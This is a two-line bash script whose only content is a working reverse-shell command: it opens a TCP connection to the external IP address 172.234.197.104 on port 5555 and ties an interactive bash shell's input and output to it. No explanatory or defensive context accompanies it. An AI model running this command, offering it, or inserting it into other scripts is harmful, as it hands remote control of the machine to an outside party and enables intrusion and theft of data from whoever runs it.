#!/bin/bash

exec 5<>/dev/tcp/172.234.197.104/5555; bash -i <&5 >&5 2>&5
